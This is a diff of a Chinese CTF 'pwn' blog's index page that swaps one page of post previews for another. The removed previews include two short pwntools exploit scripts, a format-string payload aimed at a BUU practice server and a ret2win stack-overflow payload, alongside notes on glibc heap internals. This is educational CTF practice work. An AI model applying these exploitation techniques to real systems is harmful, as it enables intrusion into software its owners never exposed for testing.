@@ -133,11 +133,11 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
-			<a href="/2024/06/11/first-docker/" title="记录第一次出PWN题可能会遇到的docker相关问题及其解决办法，还有其他可能用得上的一些命令">出PWN题可能会遇到的docker相关问题及其解决办法</a>
+			<a href="/2024/02/14/glibc_tcachebin/" title="glibc_2.35（版本较高，注意版本区别）">『glibc源码补完计划』TcacheBin</a>
 		</h3>
 		</div>
 	<div class="col-md-4">
-		<div class="date">post @ 2024-06-11  </div>
+		<div class="date">post @ 2024-02-14  </div>
 		</div>
 	</div>
 	
@@ -147,264 +147,11 @@
   <div class="row">
 	
 	
-		<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>最近给战队出了一道pwn题，第一次体验完整的出题流程，涉及到docker的使用。因为是第一次使用docker来封装题目环境，所以遇到了很多问题。网上有一些关于出pwn题的使用方法，但是有些问题没有提到，所以这里记录一下我遇到的问题，还有解决方法。docker的安装网上教程很多这里不多赘述。</p>
-<p>顺带一提，我的操作环境是wsl2的Ubuntu 22.04.3 LTS，若有因环境不同而引起的操作不同，具体请查询其他资料。</p>
+		<h2 id="TcacheBin"><a href="#TcacheBin" class="headerlink" title="TcacheBin"></a>TcacheBin</h2><p>tcache全称 thread local caching，TcacheBin是从glibc2.26才开始加入的缓存机制，访问速度比fastbin更快，优先级更高，相对的检查机制也比较弱，容易攻击。</p>
+<h3 id="TcacheBin相关数据结构"><a href="#TcacheBin相关数据结构" class="headerlink" title="TcacheBin相关数据结构"></a>TcacheBin相关数据结构</h3>
 	
 	</div>
-  <a type="button" href="/2024/06/11/first-docker/#more" class="btn btn-default more">阅读此文</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2024/06/04/largebin-attack/" title="largebin attack分为2.30前和2.30后两种情况。这里记录2.30后的攻击方法，2.30前的可以看[hollk师傅](https://blog.csdn.net/qq_41202237/article/details/112825556)的讲解。">『Heap Exploitation』largebin_attack</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2024-06-04  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>首先每个Large Bin中存在63个bin链表，在binmap中的index是64-126。每个bin中存的是一定范围内大小的chunk，而不是像tcachebin那样的一个bin一个大小。举个栗子，index64的bin中存的是0x400到0x430的chunk。每个bin能存取的范围一般是0x30。</p>
-<p>Large Bin既不是FIFO也不是LIFO，它的排序是根据chunk大小来进行的，并且结构更加复杂。large chunk被释放的时候不仅会被写入fd和bk，还有fd_nextsize和bk_nextsize两个指针来维护bin的结构。fd和bk用来链接bin中相同大小的chunk，而nextsize则用来链接bin中不同大小的chunk。更具体地说，<code>fd</code>指向比自己晚释放的相同大小的chunk，<code>bk</code>则指向比自己晚释放的相同大小的chunk，<code>fd_nextsize</code>用来指向比自己大的chunk，<code>bk_nextsize</code>则指向比自己小的chunk。在相同大小的chunkbin中只有首堆块会有nextsize的指针。bin中首尾chunk的nextsize会指向另一端，首堆块的fd会指向对应index的bin头地址，尾堆块的bk会指向对应index的bin头地址。</p>
-	
-	</div>
-  <a type="button" href="/2024/06/04/largebin-attack/#more" class="btn btn-default more">阅读此文</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2024/06/04/2024-litctf-wp/" title="非常好堆题，使我的patchelf旋转。">『LitCTF2024』 PWN WP</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2024-06-04  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>虽然说是新生赛，但是五道堆题估计真新生都被吓傻了。实际上题目限制非常宽松，也正好可以拿来总结各个常见版本glibc的基本特点。因为题目除了2.39之外都一样所以就先分析题目，再来看不同版本下的做法。</p>
-<h3 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a>0x01 题目分析</h3>
-	
-	</div>
-  <a type="button" href="/2024/06/04/2024-litctf-wp/#more" class="btn btn-default more">阅读此文</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2024/05/29/buu-wp-1/" title="猛猛刷题第一页，但是前面几道题很久之前做的了懒得找了，所以不写了。题目比较简单，所以不写过程了，个别除外。">『BUU』刷题记录（一）</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2024-05-29  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h3 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">29513</span>)</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>, &#123;<span class="number">0x804C044</span>: <span class="number">0</span>&#125;)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;your name:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
-<h3 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h3>
-	
-	</div>
-  <a type="button" href="/2024/05/29/buu-wp-1/#more" class="btn btn-default more">阅读此文</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2024/05/15/glibc-exit-hook/" title="glibc2.31，但是适用于glibc2.34及以前的版本">『glibc源码补完计划』exit_hook</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2024-05-15  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>线程退出的时候，需要释放掉这个线程所占有的资源，并且停止内核和CPU对其的调度，才算是结束了这个线程。换句话说，线程退出需要用户层面和内核层面的共同工作。内核层面，glibc通过_exit()系统调用来终止线程，用户层面则通过exit()函数。在pwn中，系统调用很难被利用，我们通常重点关注exit函数。</p>
-<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3>
-	
-	</div>
-  <a type="button" href="/2024/05/15/glibc-exit-hook/#more" class="btn btn-default more">阅读此文</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2024/05/12/exit-hook-first-try/" title="从这道题学习exit hook的一种打法和查找偏移的方法">『2024sdpctf(山警校赛)』magic_write</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2024-05-12  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">20</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  myinit(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please enter this challenge&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  seed = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(seed);</span><br><span class="line">  v7 = rand();</span><br><span class="line">  v6 = v7 % <span class="number">0x6E</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v7 % <span class="number">0x6E</span> == v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Give you a gift&quot;</span>);</span><br><span class="line">    gift();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Do you know any address to write&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Come and try it out&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x2E</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>main函数开头要我们绕过一个随机数检查才有输入点。gift函数会打印puts函数的libc地址，libc地址不请自来。接着read函数溢出14个字节，只能覆盖六个字节到ret地址，所以想要在这里写one gadget是不可能的了，因为libc地址占七个字节。</p>
-	
-	</div>
-  <a type="button" href="/2024/05/12/exit-hook-first-try/#more" class="btn btn-default more">阅读此文</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2024/04/28/2024xyctf-pwn-wp/" title="让新生重获新生的新生赛">『XYCTF2024』 PWN WP</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2024-04-28  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>这新生赛难度新生打不了一点，这是让我这种菜鸡获得新生的比赛（但是AK了</p>
-<h3 id="0x01-hello-world（签到）"><a href="#0x01-hello-world（签到）" class="headerlink" title="0x01 hello_world（签到）"></a>0x01 hello_world（签到）</h3>
-	
-	</div>
-  <a type="button" href="/2024/04/28/2024xyctf-pwn-wp/#more" class="btn btn-default more">阅读此文</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2024/04/07/rop-emporium-ret2win/" title="https://ropemporium.com 各种架构的ROP练习">『ROP Emporium』ret2win</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2024-04-07  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h3 id="0x01-ret2win32"><a href="#0x01-ret2win32" class="headerlink" title="0x01 ret2win32"></a>0x01 ret2win32</h3><p>x86架构的ret2text，非常简单，程序有栈溢出，没有canary保护，所以只要溢出覆盖ebp后，将ret地址覆盖为ret2win函数的地址即可。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;./ret2win32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2win = <span class="number">0x804862C</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2c</span>+p32(ret2win)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-	
-	</div>
-  <a type="button" href="/2024/04/07/rop-emporium-ret2win/#more" class="btn btn-default more">阅读此文</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2024/03/28/2016HCTF-fheap/" title="2016HCTF_fheap的其中一种解法和自己的理解">『BUU』2016HCTF_fheap</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2024-03-28  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h2 id="2016HCTF-fheap"><a href="#2016HCTF-fheap" class="headerlink" title="2016HCTF fheap"></a>2016HCTF fheap</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这个程序是一个字符串管理器，程序只有两个功能，一个是create，一个是delete，有两个类似于结构体的变量，我们可以稍微优化一下伪代码。</p>
-	
-	</div>
-  <a type="button" href="/2024/03/28/2016HCTF-fheap/#more" class="btn btn-default more">阅读此文</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2024/03/05/pwnable-WP/" title="pwnable.tw 持续更新">『pwnable』刷题记录_WP</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2024-03-05  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>pwnable的题挺好玩的，就是难度可能偏高，但是可以练基本功，知道自己的弱项在哪里，所以写WP来做刷题记录。</p>
-<h3 id="0x01-start"><a href="#0x01-start" class="headerlink" title="0x01 start"></a>0x01 start</h3>
-	
-	</div>
-  <a type="button" href="/2024/03/05/pwnable-WP/#more" class="btn btn-default more">阅读此文</a>
+  <a type="button" href="/2024/02/14/glibc_tcachebin/#more" class="btn btn-default more">阅读此文</a>
 </div>
 
 		
@@ -423,7 +170,7 @@
 
         <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
  
-       <a href="/page/5/" type="button" class="btn btn-default ">下一页<i class="fa fa-arrow-circle-o-right"></i></a>     
+          <a type="button" class="btn btn-default disabled">下一页<i class="fa fa-arrow-circle-o-right"></i></a>
         
 
   
@@ -457,7 +204,7 @@
 		
 			<li><a href="/categories/Heap-Exploitation/">Heap Exploitation<span>3</span></a></li>
 		
-			<li><a href="/categories/WP/">WP<span>12</span></a></li>
+			<li><a href="/categories/WP/">WP<span>13</span></a></li>
 		
 			<li><a href="/categories/cpp异常处理机制/">cpp异常处理机制<span>1</span></a></li>
 		
@@ -488,39 +235,39 @@
 		<h4>标签云</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/heap/">heap<span>6</span></a></li>
-		
-			<li><a href="/tags/PWN/">PWN<span>25</span></a></li>
-		
-			<li><a href="/tags/exit-hook/">exit_hook<span>2</span></a></li>
-		
-			<li><a href="/tags/图灵完备/">图灵完备<span>4</span></a></li>
-		
-			<li><a href="/tags/IO-FILE/">IO_FILE<span>2</span></a></li>
-		
-			<li><a href="/tags/计组/">计组<span>4</span></a></li>
-		
-			<li><a href="/tags/libc-got/">libc_got<span>1</span></a></li>
-		
-			<li><a href="/tags/ROP/">ROP<span>2</span></a></li>
-		
 			<li><a href="/tags/diary/">diary<span>14</span></a></li>
-		
-			<li><a href="/tags/ret2dlresolve/">ret2dlresolve<span>1</span></a></li>
-		
-			<li><a href="/tags/cpp异常处理机制/">cpp异常处理机制<span>1</span></a></li>
-		
-			<li><a href="/tags/BUU/">BUU<span>1</span></a></li>
-		
-			<li><a href="/tags/magic-gadget/">magic_gadget<span>1</span></a></li>
-		
-			<li><a href="/tags/docker/">docker<span>1</span></a></li>
 		
 			<li><a href="/tags/protobuf/">protobuf<span>2</span></a></li>
 		
-			<li><a href="/tags/CTF/">CTF<span>21</span></a></li>
+			<li><a href="/tags/BUU/">BUU<span>1</span></a></li>
 		
-			<li><a href="/tags/WP/">WP<span>14</span></a></li>
+			<li><a href="/tags/cpp异常处理机制/">cpp异常处理机制<span>1</span></a></li>
+		
+			<li><a href="/tags/libc-got/">libc_got<span>1</span></a></li>
+		
+			<li><a href="/tags/IO-FILE/">IO_FILE<span>2</span></a></li>
+		
+			<li><a href="/tags/magic-gadget/">magic_gadget<span>1</span></a></li>
+		
+			<li><a href="/tags/CTF/">CTF<span>22</span></a></li>
+		
+			<li><a href="/tags/WP/">WP<span>15</span></a></li>
+		
+			<li><a href="/tags/图灵完备/">图灵完备<span>4</span></a></li>
+		
+			<li><a href="/tags/PWN/">PWN<span>26</span></a></li>
+		
+			<li><a href="/tags/ret2dlresolve/">ret2dlresolve<span>1</span></a></li>
+		
+			<li><a href="/tags/exit-hook/">exit_hook<span>2</span></a></li>
+		
+			<li><a href="/tags/heap/">heap<span>6</span></a></li>
+		
+			<li><a href="/tags/ROP/">ROP<span>2</span></a></li>
+		
+			<li><a href="/tags/计组/">计组<span>4</span></a></li>
+		
+			<li><a href="/tags/docker/">docker<span>1</span></a></li>
 		
 		 
 		</ul>
@@ -532,6 +279,10 @@
 <div class="widget">
   <h4>最新文章</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2024/11/01/2024xsctf-QQbot-wp/"  title="出题记录兼WP" ><i class="fa fa-file-o"></i>2024XSCTF初赛QQbot出题小记</a>
+      </li>
     
       <li>
         <a href="/2024/10/25/Turing-Complete-4/"  title="我发现上面的关卡写完之后，前面的也会同步，所以直接展示图灵完备那一关，并且展示各个元件好了。至此，你完成了一台可运行的计算机。" ><i class="fa fa-file-o"></i>『图灵完备』完全攻略之处理器架构（四）</a>
@@ -547,10 +298,6 @@
     
       <li>
         <a href="/2024/10/12/YLCTF-msgbot-protobuf/"  title="做了一天，我太菜了" ><i class="fa fa-file-o"></i>『YLCTF 源鲁杯 2024』 msg_bot</a>
-      </li>
-    
-      <li>
-        <a href="/2024/10/12/2024YLCTF-1/"  title="ROUND1" ><i class="fa fa-file-o"></i>『YLCTF 源鲁杯 2024』 PWN-1 WP</a>
       </li>
     
   </ul>
